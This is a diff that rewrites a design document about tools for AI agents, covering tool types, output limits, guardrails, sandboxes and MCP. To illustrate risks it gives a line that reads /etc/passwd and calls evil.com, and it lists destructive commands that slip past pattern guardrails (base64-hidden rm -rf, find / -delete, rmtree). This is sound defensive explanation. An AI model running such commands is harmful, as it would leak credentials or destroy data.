@@ -1,17 +1,37 @@
 # Tool
 
-A Tool is a named function with a schema that performs a side effect and returns a result. It is the only primitive through which an agent affects the outside world.
+A Tool is a function that an agent calls to do work that the model cannot do.
+For example, a Tool can read a file, run a command or send an email. Each Tool
+has a name and a schema for its parameters, and it gives back a result. The Tool
+is the only primitive that lets an agent have an effect on external systems.
 
-## Why It Matters
+<a id="why-it-matters"></a>
 
-The [LLM](llm.md) reasons but cannot act. It cannot read a file, query a database, send an email, or execute code. Every interaction between an agent and its environment goes through Tools. The set of Tools available to an agent defines what the agent can do — an agent with `[fileRead, fileWrite, bash]` is a coding assistant; the same agent with `[queryDatabase, sendEmail, createTicket]` is a support agent. The architecture is identical; the capabilities differ entirely.
+## Value
 
-## Formal Definition
+The [LLM](llm.md) can only read text and write text. It cannot read a file, send
+a query to a database, send an email or run code. Each operation of an agent on
+its environment goes through a Tool.
+
+The set of Tools controls the work that an agent can do. With
+`[fileRead, fileWrite, bash]`, an agent is a coding agent. With
+`[queryDatabase, sendEmail, createTicket]`, the same agent helps customers. The
+structure of the two agents is the same. Only their tools are different.
+
+Tools are not equal. A specific tool does one operation. A generative tool, for
+example `bash`, can run each program. A more open tool lets the agent do more
+work, but it is harder to control. The result of each tool also goes into the
+context of the LLM. Thus the output of a tool is an important part of the agent
+system.
+
+<a id="formal-definition"></a>
+
+## Definition
 
 ```typescript
 type Tool = {
   name: string;
-  schema: JSONSchema; // input schema — what the LLM sees when deciding to call
+  schema: JSONSchema; // input schema: the LLM reads it to select a call
   execute: (params: unknown) => Promise<ToolResult>; // side effect!
 };
 
@@ -21,17 +41,55 @@ type ToolResult = {
 };
 ```
 
-The `schema` serves a dual purpose: it tells the LLM what parameters the tool accepts (for correct invocation), and it tells the LLM what the tool _does_ (via the name and description fields in the schema). The LLM reads the schema to decide whether and how to call the tool.
+The `schema` has two functions. It tells the LLM the parameters of the tool.
+Then the LLM can call the tool correctly. The name and the description in the
+schema also tell the LLM the function of the tool. The LLM reads the schema to
+select a tool and its arguments.
 
-The `execute` function is the only place in the entire agent system where side effects occur. Everything else — LLM calls, routing decisions, memory retrieval — is either pure computation or reads. Tools write to the world.
+The `execute` function is the only part of an agent system that changes external
+systems. All the other parts only calculate or read, for example the LLM calls,
+the routing decisions and the data from Memory. Tools write to external systems.
 
----
+<a id="the-tool-expressiveness-spectrum"></a>
 
-## The Tool Expressiveness Spectrum
+## The range of tools
 
-Not all tools are equal. There is a qualitative break in what different tools allow the agent to do, and this break has deep consequences for capability, safety, and system design.
+Tools go from closed to open:
 
-### Specific Tools — Closed Action Space
+- A specific tool does only one operation.
+- A parameterized tool makes new queries in one system, for example a database.
+- A generative tool can run each program.
+
+The position of a tool on this range has large effects. It changes the work that
+the agent can do, the safety and the structure of the system.
+
+<a id="the-spectrum-and-its-consequences"></a>
+
+```
+Specific          Parameterized        Generative
+file_read         sql_query            bash
+grep              http_request         python
+gmail_send        graphql              code execution
+─────────────────────────────────────────────────────→
+Closed ←── action space ──→ Open
+Easy  ←── guardrailing  ──→ Hard
+High  ←── predictability ──→ Low
+None  ←── environment coupling ──→ Full
+```
+
+Each agent system must balance the work that the agent can do against how easily
+you can control the agent. A more open tool set lets the agent do more work, but
+it is harder to keep the agent in limits. A more specific tool set makes the
+agent safer, but the agent can do less work.
+
+<a id="specific-tools--closed-action-space"></a>
+
+### Specific tools
+
+A specific tool does one operation. The agent can do only the operations that
+the author gave to the tool. You can make a list of each possible operation of
+the tool. `file_read` reads one file. `grep` finds a pattern. No set of
+parameters makes them do a different operation.
 
 ```typescript
 const fileRead: Tool = {
@@ -47,11 +105,22 @@ const grepTool: Tool = {
 };
 ```
 
-A specific tool does one thing. The agent can only do what the tool designer anticipated. The capability surface is **closed** — you can enumerate every possible action the tool can take. `file_read` reads one file. `grep` searches for a pattern. No combination of parameters makes them do anything else.
+A specific tool has these properties:
 
-**Properties**: predictable behavior, easy to [guardrail](../harness/guardrail.md), inspectable by humans, testable with conventional techniques.
+- You can know the result of each call before the call.
+- A [Guardrail](../harness/guardrail.md) can control it easily.
+- A person can examine its calls.
+- Standard tests can examine it.
 
-### Parameterized Tools — Open Queries Within a Bounded Domain
+<a id="parameterized-tools--open-queries-within-a-bounded-domain"></a>
+
+### Parameterized tools
+
+A parameterized tool operates on one system with limits, for example a database
+or an HTTP endpoint. But the agent writes the parameters, thus it can make new
+queries. `query_database` can run each SQL query, also `DROP TABLE`.
+`http_request` can send a request to each URL. The set of operations is open in
+the system, but the system has limits.
 
 ```typescript
 const sqlQuery: Tool = {
@@ -68,11 +137,23 @@ const httpRequest: Tool = {
 };
 ```
 
-The tool's domain is bounded (a database, an HTTP endpoint), but the agent composes the parameters to create novel queries. `query_database` can express any SQL query — including `DROP TABLE`. `http_request` can reach any URL. The capability surface is open within the domain, but the domain itself is bounded.
+A parameterized tool has these properties:
 
-**Properties**: flexible within a domain, guardrails must inspect parameter content (not just tool name), domain-specific risks (SQL injection, SSRF).
+- It is flexible in its system.
+- A Guardrail must examine the contents of the parameters, not only the name of
+  the tool.
+- Each system has its risks. For example, an attacker can put SQL commands into
+  a query. An attacker can also make the server send requests to internal
+  servers.
 
-### Generative Tools — Open Action Space
+<a id="generative-tools--open-action-space"></a>
+
+### Generative tools
+
+A generative tool lets the agent write and run each program. The set of
+operations is open: you cannot make a list of all the operations of the agent.
+This difference from a specific tool is not a difference of quantity. A
+generative tool is a different type of tool.
 
 ```typescript
 const bash: Tool = {
@@ -88,61 +169,113 @@ const pythonExec: Tool = {
 };
 ```
 
-A generative tool is a computation substrate. The agent writes arbitrary programs. The capability surface is **open** — you cannot enumerate what the agent can do. This is not a difference in degree from specific tools; it is a difference in kind.
+With `bash`, an agent can do these operations:
 
-Give an agent bash and it can:
+- **Use each installed program**: `grep`, `git`, `curl`, `docker`, `kubectl` and
+  each other binary.
+- **Write programs in each language**: Python scripts, short `node` commands,
+  compiled Rust programs.
+- **Install new software** with `pip install`, `npm install` or `apt-get`. Thus
+  the agent adds new functions while it runs.
+- **Move through the filesystem and change it**: all of the
+  [Workspace](../patterns/workspace.md).
+- **Use the network**: `curl`, `wget`, `ssh` and API calls to each endpoint that
+  the agent has access to.
+- **Control processes**: start servers, start tasks that continue after the
+  command, and stop processes.
+- **Connect all these operations** into new workflows that no person made.
 
-- **Use any CLI tool** — grep, git, curl, docker, kubectl, any installed binary
-- **Write programs in any language** — Python scripts, Node one-liners, compiled Rust
-- **Install new software** — `pip install`, `npm install`, `apt-get` — extending its own capability at runtime
-- **Navigate and manipulate the filesystem** — the entire [Workspace](../patterns/workspace.md)
-- **Reach the network** — curl, wget, ssh, API calls to any reachable endpoint
-- **Manage processes** — start servers, run background tasks, kill processes
-- **Chain all of the above** into novel workflows nobody designed
+Thus `bash` does not give the agent a tool. It gives the agent a computer.
+`bash` can do the work of each specific tool:
 
-Bash doesn't give the agent _a tool_. It gives the agent _a computer_. It is the Turing machine of tools — it can implement any specific tool. `file_read(path)` is `bash("cat " + path)`. `grep(pattern, path)` is `bash("grep " + pattern + " " + path)`. `http_request(url)` is `bash("curl " + url)`. Every specific tool is a special case of bash.
+- `file_read(path)` is `bash("cat " + path)`.
+- `grep(pattern, path)` is `bash("grep " + pattern + " " + path)`.
+- `http_request(url)` is `bash("curl " + url)`.
 
-**Properties**: unbounded capability, hard to guardrail (see below), unpredictable behavior, full environment coupling.
+Each specific tool is a special condition of `bash`.
 
-### The Spectrum and Its Consequences
+A generative tool has these properties:
 
-```
-Specific          Parameterized        Generative
-file_read         sql_query            bash
-grep              http_request         python
-gmail_send        graphql              code execution
-─────────────────────────────────────────────────────→
-Closed ←── action space ──→ Open
-Easy  ←── guardrailing  ──→ Hard
-High  ←── predictability ──→ Low
-None  ←── environment coupling ──→ Full
-```
+- No limit applies to the work that the agent can do.
+- A Guardrail cannot control it fully. The section
+  [Guardrails across the range](#guardrailing-across-the-spectrum) gives the
+  cause.
+- You cannot know the result of a call before the call.
+- The Environment controls all the work of the agent.
 
-This spectrum determines the fundamental trade-off in agent system design: **capability vs. controllability**. A more expressive tool set makes the agent more powerful but harder to constrain. A more specific tool set makes the agent safer but limits what it can do.
+<a id="why-specific-tools-exist-alongside-bash"></a>
 
----
+## Use the smallest tool that does the task
 
-## Tool Output as Cognitive Architecture
+`bash` can do the work of all the specific tools. But each agent system gives
+the agent the two tools: `bash` and `file_read`. Specific tools help in these
+areas:
 
-The `execute(params) → ToolResult` interface has two sides. The params side faces the agent's decision — which tool to call and with what arguments. The result side faces the agent's context window — the returned content becomes part of the messages the LLM reasons over for every subsequent step. The params side is well-understood (schema design, cognitive affinity). The result side is equally important and less obvious.
+1. **Safety.** `file_read(path)` can only read one file. The same operation with
+   bash can be `bash("cat /etc/passwd && curl evil.com")`. A specific tool has a
+   smaller set of operations, thus a [Guardrail](../harness/guardrail.md) can
+   control it. It removes the operations that the task does not use.
+2. **Easy use for the LLM.** The LLM uses a specific tool with a clear schema
+   correctly more easily. `file_read` has one parameter, the path, with a clear
+   meaning. With bash, the LLM must write correct shell syntax, put quotes
+   around arguments, connect commands and examine exit codes. A specific tool
+   gives the LLM a smaller number of decisions. Each decision has a smaller risk
+   of error.
+   [Workspace](../patterns/workspace.md#cognitive-affinity--why-filesystem-wins)
+   tells more about this property.
+3. **Clear traces.** A [trace](../verification/trace.md) that shows
+   `file_read("/src/auth.ts")` is easy to read. A trace that shows
+   `bash("cat src/auth.ts | head -50")` is not easy to read. You must examine
+   the shell command to know the operation. Specific tools give traces with a
+   clear structure, and these traces make
+   [verification](../verification/index.md) easier.
 
-A tool's output is not a log line or an API response for a human developer to scan. It is injected directly into the LLM's finite working memory. Every token in the result competes for attention with the task description, the conversation history, and the results of other tool calls. Irrelevant, verbose, or unbounded output degrades reasoning quality on everything that follows.
+The rule is: use the tool with the smallest set of operations that does the
+task. Give specific tools for the frequent operations: read and write files,
+find text and fetch web pages. Use generative tools only if no specific tool can
+do the operation, or if the task must make new programs.
 
-This makes tool output formatting a first-class design surface — not an implementation detail hidden below the tool boundary.
+<a id="tool-output-as-cognitive-architecture"></a>
 
-### Output Bounding
+## Tool output
 
-The highest-leverage output design decision is **bounding**. A search tool that returns 10,000 matching lines has not given the agent more information to work with. It has flooded the agent's working memory with noise that will degrade every subsequent reasoning step until the context is compacted or the session ends.
+The output of a tool goes directly into the context of the LLM. Thus the output
+is an important part of the agent system, not only an internal part of the tool.
+
+The `execute(params) → ToolResult` interface has two sides:
+
+- **The parameter side** goes from the agent to the tool. It holds the decision
+  of the agent: which tool to call, and with which arguments. The schema
+  controls this side, and engineers know it.
+- **The result side** goes from the tool to the agent. The result becomes a part
+  of the messages that the LLM reads for each subsequent step. This side is
+  equally important, but it is not easy to see.
+
+The output of a tool is not a log line or an API response for a developer. The
+harness puts it directly into the context of the LLM, and this context has a
+limit. Each token of the result uses space in the context. The task, the history
+and the results of other tool calls use the same space. Long output, output
+without a limit and output that is not related make the reasoning worse for all
+the subsequent steps.
+
+<a id="output-bounding"></a>
+
+### Limits on the output
+
+The decision with the largest effect on output is a limit on its length. A tool
+that finds 10,000 lines does not give the agent more data that it can use. It
+fills the context with noise. This noise makes each subsequent step worse until
+the harness makes the context smaller or the Session stops.
 
 ```typescript
-// Unbounded — context flooding
+// No limit: the results fill the context
 const naiveGrep: Tool = {
   name: "search",
   execute: (params) => grep(params.pattern, params.path),
   // Returns all matches. 10,000 lines? All of them.
 };
 
-// Bounded — forces refinement
+// A limit: the agent must make the search narrower
 const boundedSearch: Tool = {
   name: "search",
   execute: (params) => {
@@ -157,21 +290,35 @@ const boundedSearch: Tool = {
 };
 ```
 
-The bounded version transforms a context-flooding failure mode into a refinement loop. The agent cannot proceed by being vague — it must be specific. This pushes the agent toward more deliberate, targeted behavior. The SWE-agent paper demonstrated that this single design decision — capping search results at 50 — was among the highest-leverage changes in the entire system.
+With the limit, the agent cannot continue with a query that is not clear. It
+must make the query more accurate. Thus the limit changes an error into a loop
+that makes the query better. The agent does its work in smaller and more careful
+steps. The SWE-agent paper examined this one decision: a limit of 50 results. It
+showed that this limit was one of the changes with the largest effect in all the
+system.
 
-### Output Formatting
+<a id="output-formatting"></a>
 
-How results are formatted determines whether the LLM can use them efficiently. Line numbers prepended to file content let the agent reference specific lines in subsequent edit commands without counting. Structured summaries of command output let the agent extract what it needs without parsing raw text. Error messages that include both what went wrong and how to fix it close the feedback loop in one step.
+### Output format
+
+The format of the result controls how easily the LLM can use it. For example:
+
+- Line numbers in front of the file contents let the agent refer to a line in a
+  command that changes the file. The agent does not count the lines.
+- A short text with a structure about the command output lets the agent find the
+  data that it must have. The agent does not parse the full output.
+- An error message that tells the cause and the correction lets the agent
+  correct the error in one step.
 
 ```typescript
-// Raw output — agent must parse and count
+// Raw output: the agent must parse and count
 const rawViewer: Tool = {
   name: "view_file",
   execute: (params) => readFile(params.path),
-  // Returns file content. Agent must count lines to reference line 47.
+  // Returns the file. The agent must count lines to refer to line 47.
 };
 
-// Formatted output — cognitive load removed
+// Formatted output: the agent does not count
 const formattedViewer: Tool = {
   name: "view_file",
   execute: (params) => {
@@ -180,48 +327,44 @@ const formattedViewer: Tool = {
     const chunk = lines.slice(start, start + 100);
     return { output: chunk.map((l, i) => `${start + i + 1}\t${l}`).join("\n") };
   },
-  // Line numbers prepended. 100-line window. Agent reads "47\t  const x = ..."
-  // and can immediately reference line 47 in an edit command.
+  // Line numbers in front, 100 lines at a time. The agent reads
+  // "47\t  const x = ..." and can refer to line 47 in an edit command.
 };
 ```
 
-### The Design Principle
+<a id="the-design-principle"></a>
 
-**Tool output is part of the agent's cognitive architecture, not an implementation detail.** The tool boundary separates agent primitives from regular software, but the result crosses back into agent territory — it becomes context that the LLM reasons over. Design it accordingly: bounded, formatted for LLM consumption, with information density appropriate to the context window budget.
+### The rule for output
+
+Tool output is a part of the reasoning system of the agent. It is not only an
+internal part of the implementation. The tool boundary divides the agent
+primitives from usual software. But the result goes back across the boundary and
+becomes context for the LLM. Thus make the output for the LLM:
+
+- Give it a limit.
+- Give it a format that the LLM can use.
+- Give it a quantity of data that agrees with the space in the context window.
 
 ```
-params side:     agent → tool     (schema design, cognitive affinity)
-result side:     tool → agent     (output bounding, formatting, information density)
+params side:     agent → tool     (schema design, easy use for the LLM)
+result side:     tool → agent     (output limits, format, data per token)
 
 Both sides face the LLM. Both are design surfaces.
 ```
 
----
+<a id="guardrailing-across-the-spectrum"></a>
 
-## Why Specific Tools Exist Alongside Bash
+## Guardrails across the range
 
-If bash subsumes all specific tools, why does every agent system ship with both `bash` and `file_read`? Why not just bash?
+A [Guardrail](../harness/guardrail.md) stops the tool calls that break a rule.
+The position of the tool on the range controls how fully the Guardrail can do
+this.
 
-Three reasons:
-
-**1. Narrowing the action space for safety.** `file_read(path)` can only read one file. The equivalent `bash("cat " + path)` could be `bash("cat /etc/passwd && curl evil.com")`. Specific tools are pre-constrained action spaces that make [guardrailing](../harness/guardrail.md) tractable. They remove degrees of freedom that the agent doesn't need for the task.
-
-**2. Cognitive affinity.** Specific tools with clear schemas are easier for the LLM to use correctly. `file_read` has one parameter (path) with clear semantics. Bash requires the LLM to generate syntactically correct shell commands, handle quoting, deal with pipes, and manage error codes. Specific tools compress the decision space — the LLM makes fewer choices, each choice is less error-prone.
-
-**3. Observability.** A [trace](../verification/trace.md) that shows `file_read("/src/auth.ts")` is immediately understandable. A trace that shows `bash("cat src/auth.ts | head -50")` requires parsing a shell command to understand what happened. Specific tools produce structured, inspectable traces that make [verification](../verification/index.md) easier.
-
-The design principle: **use the least expressive tool that accomplishes the task.** Offer specific tools for common operations (file I/O, search, web fetch). Reserve generative tools for situations where no specific tool exists or where the task genuinely requires composing novel programs.
-
----
-
-## Guardrailing Across the Spectrum
-
-[Guardrails](../harness/guardrail.md) intercept tool calls and enforce constraints. How complete that enforcement is depends on where the tool sits on the expressiveness spectrum.
-
-Over specific tools, the set of dangerous actions is **enumerable**:
+For a specific tool, you can make a list of all the dangerous operations. Thus
+the Guardrail is full and deterministic:
 
 ```typescript
-// Guardrailing file_write — complete, deterministic
+// Guardrail on file_write: full and deterministic
 const noSystemWrites: Guardrail = {
   pre: (action) => {
     if (action.name === "file_write" && action.params.path.startsWith("/etc/"))
@@ -231,10 +374,10 @@ const noSystemWrites: Guardrail = {
 };
 ```
 
-Over generative tools, the set of dangerous actions is **unbounded**:
+For a generative tool, the set of dangerous operations has no limit:
 
 ```typescript
-// Guardrailing bash — incomplete, pattern-matching
+// Guardrail on bash: not full, it only matches patterns
 const noDangerousCommands: Guardrail = {
   pre: (action) => {
     if (action.name === "bash") {
@@ -244,68 +387,95 @@ const noDangerousCommands: Guardrail = {
       // ... but what about: $(echo cm0gLXJm | base64 -d)?
       // ... or: find / -delete?
       // ... or: python -c "import shutil; shutil.rmtree('/')"?
-      // The set of equivalent dangerous commands is infinite.
+      // The set of equal dangerous commands has no end.
     }
     return { allow: true };
   },
 };
 ```
 
-Pattern-based guardrails catch common dangerous commands and raise the bar against accidental damage. For complete coverage over generative tools, production systems combine guardrails with environment-level containment — **layered defense**:
+A Guardrail with patterns catches the frequent dangerous commands. It decreases
+the risk of accidental damage. For full protection with generative tools, the
+systems that persons use also set limits at the Environment level. This is a
+defense in layers:
 
-1. **Specific tools for common operations** — guardrail interception provides complete coverage
-2. **Pattern-based guardrails on bash** — catch known dangerous commands at the tool call level
-3. **Sandboxed environments** — contain blast radius at the environment level (network isolation, filesystem restrictions, no credentials)
-4. **Human-in-the-loop** — require approval for commands matching risk patterns
+1. **Specific tools for frequent operations.** The Guardrail examines each call,
+   thus the protection is full.
+2. **Guardrails with patterns on bash.** They catch known dangerous commands at
+   the tool call.
+3. **Sandboxes.** They keep the damage small at the
+   [Environment](../environment/environment.md) level: no network, limits on the
+   filesystem and no credentials.
+4. **Approval by a person.** A person must give approval for each command that
+   agrees with a risk pattern.
 
-This is how guardrails and environments compose: guardrails enforce constraints at the tool boundary, sandboxes enforce constraints at the environment boundary. For specific tools, the tool boundary is sufficient. For generative tools, both layers work together.
+This is how Guardrails and Environments compose. Guardrails apply rules at the
+tool boundary. Sandboxes apply rules at the Environment boundary. For specific
+tools, the tool boundary is sufficient. For generative tools, the two layers
+operate together.
 
----
+<a id="generative-tools-as-the-interface-to-the-environment"></a>
 
-## Generative Tools as the Interface to the Environment
+## Generative tools and the Environment
 
-Generative tools are the mechanism through which the agent accesses and modifies its [Environment](../environment/environment.md).
+Generative tools give the agent access to its
+[Environment](../environment/environment.md), and they let the agent change it.
 
-With specific tools, the Environment is a passive, deployment-time configuration — the agent gets `file_read` configured to access a specific directory, and that's all it can reach. With bash, the Environment becomes something the agent **actively reaches and modifies through a tool**:
+With specific tools, the Environment is a configuration that the developer sets
+before the agent starts. For example, the agent gets `file_read` for one
+directory, and it has no access to other resources. With bash, the agent goes
+into the Environment and changes it with a tool:
 
 ```typescript
-// The agent modifies its own environment:
-bash("npm install some-new-package"); // extends available libraries
-bash("pip install playwright && playwright install"); // adds browser capability
-bash("docker run -d postgres"); // spins up infrastructure
-bash("ssh remote-server 'deploy.sh'"); // reaches external systems
+// The agent changes its own environment:
+bash("npm install some-new-package"); // adds libraries
+bash("pip install playwright && playwright install"); // adds a browser
+bash("docker run -d postgres"); // starts a database server
+bash("ssh remote-server 'deploy.sh'"); // goes to external systems
 ```
 
-The agent's capability surface is no longer bounded by the tools the harness provides. It's bounded by the **environment** — what's installed, what's network-reachable, what credentials are available. This is why sandboxing matters: the sandbox defines the true capability boundary for an agent with generative tools.
+Then the tools of the harness do not set the limit on the work of the agent. The
+Environment sets it: the installed software, the network that the agent has
+access to and the available credentials. Thus a sandbox sets the limit that
+applies to an agent with generative tools.
 
 ```
 Specific tools:    capability = Σ(tool schemas)
 Generative tools:  capability = f(environment)
 ```
 
----
+<a id="mcp-and-dynamic-tool-discovery"></a>
 
-## MCP and Dynamic Tool Discovery
+## MCP and tools that the agent finds while it runs
 
-MCP (Model Context Protocol) tools occupy an interesting position on the expressiveness spectrum. Each individual MCP tool is specific — `gmail_send(to, subject, body)` does one thing with a clear schema. But the _set of available MCP tools_ is open-ended — the agent can discover and invoke tools it wasn't configured with at startup.
+MCP tools have a special position on the range. Each MCP tool is a specific
+tool: `gmail_send(to, subject, body)` does one operation with a clear schema.
+But the set of MCP tools is open. The agent can find and call tools that it did
+not have at the start.
 
-This gives MCP a way to achieve open-ended capability through a **collection of constrained tools** rather than through one unconstrained tool. Architecturally, this is safer than bash:
+Thus MCP gets an open set of operations from a set of tools with limits, not
+from one tool without limits. This structure is safer than bash:
 
-| Property          | Bash                    | MCP Tool Collection             |
-| ----------------- | ----------------------- | ------------------------------- |
-| Individual action | Unbounded               | Bounded per tool                |
-| Total capability  | Open (any command)      | Open (any registered tool)      |
-| Guardrailability  | Hard (pattern matching) | Easy (per-tool schema)          |
-| Discoverability   | None (agent explores)   | Structured (registry + schemas) |
-| Trust model       | Trust the sandbox       | Trust per tool provider         |
+| Property          | Bash                       | MCP tools                       |
+| ----------------- | -------------------------- | ------------------------------- |
+| One operation     | No limit                   | A limit for each tool           |
+| All operations    | Open: each command         | Open: each tool in the registry |
+| Guardrail control | Hard: patterns only        | Easy: the schema of each tool   |
+| Find a new tool   | No aid: the agent examines | A registry and schemas          |
+| Safety comes from | The sandbox                | Each tool provider              |
 
-MCP tools are the safe version of bash's openness — they provide the extensibility (new capabilities at runtime) without the uncontrollability (arbitrary commands). This is why MCP and similar protocols matter: they allow the tool set to grow without giving up the ability to reason about and constrain individual actions.
+MCP tools give the open set of operations of bash, and they stay safe. The agent
+gets new functions while it runs, but it does not get commands that no person
+can control. This is the value of MCP and of protocols of the same type. The
+tool set can become larger, and you can continue to examine each operation and
+set limits on it.
 
----
+<a id="tools-as-the-architectural-boundary"></a>
 
-## Tools as the Architectural Boundary
+## Tools as the boundary of the agent system
 
-Tools define the boundary between the agent system and regular software. The `execute(params) → result` interface is the seam:
+Tools are the boundary between the agent system and usual software. The
+`execute(params) → result` interface is the point where the two connect:
 
 ```
 Agent system:       LLM + Tool (primitives) + patterns built over them
@@ -315,18 +485,33 @@ Tool boundary:      execute(params) → result
 Everything below:   Regular software (databases, pipelines, APIs, infrastructure)
 ```
 
-- **Above the boundary**: the agent system — LLM reasoning plus the harness that structures it (AgentLoop, Session, Guardrail, Agent) and the patterns composed on top (Memory, Channel, orchestration). This is where non-deterministic reasoning happens.
-- **Below the boundary**: regular software engineering — databases, APIs, pipelines, infrastructure. This is deterministic, well-understood, and testable with conventional techniques.
+- **Above the boundary** is the agent system. It holds the LLM, the harness that
+  gives it structure ([AgentLoop](../harness/agent-loop.md), Session, Guardrail,
+  Agent) and the patterns on top of them. Examples of these patterns are Memory,
+  Channel and Topology. Here the reasoning is not deterministic.
+- **Below the boundary** is usual software: databases, APIs, pipelines and
+  servers. It is deterministic, engineers know it, and standard tests can
+  examine it.
 
-The agent doesn't know or care what lives behind the tool interface. A `query_portfolio` tool might execute a simple SQL query or trigger a multi-stage ETL pipeline — the agent sees the same `(params) → result` signature either way. This separation is what makes agent systems composable: you can swap the implementation behind any tool without changing the agent.
-
----
+The agent does not know the software behind the tool interface. A
+`query_portfolio` tool can run one short SQL query. It can also start a pipeline
+that moves and changes data in many steps. The agent sees the same
+`(params) → result` signature for the two. Because of this division, you can
+compose agent systems. You can replace the software behind a tool and keep the
+agent the same.
 
 ## Related
 
-- [LLM](llm.md) — the other atomic primitive; LLM reasons, Tool acts
-- [AgentLoop](../harness/agent-loop.md) — the recursive cycle that connects LLM decisions to Tool execution
-- [Guardrail](../harness/guardrail.md) — constraints that wrap tool execution; hard for specific tools, best-effort for generative tools
-- [Workspace](../patterns/workspace.md) — the structured data space accessed through tools; filesystem tools have maximum cognitive affinity
-- [Environment](../environment/environment.md) — the substrate generative tools reach into; the capability boundary for open-action-space tools
-- [Agent](../harness/agent.md) — wires a Session to a specific Environment behind a Frontend
+- [LLM](llm.md): the LLM selects the steps, and the Tool does these steps. The
+  LLM and the Tool are primitives.
+- [AgentLoop](../harness/agent-loop.md): the loop that connects the decisions of
+  the LLM to the tool runs.
+- [Guardrail](../harness/guardrail.md): the rules around each tool call. They
+  are full for specific tools and not full for generative tools.
+- [Workspace](../patterns/workspace.md): the data with a structure that the
+  agent has access to through tools. The LLM uses filesystem tools most easily.
+- [Environment](../environment/environment.md): the resources that generative
+  tools have access to. It sets the limit for tools with an open set of
+  operations.
+- [Agent](../harness/agent.md): connects a Session to one Environment behind a
+  frontend.
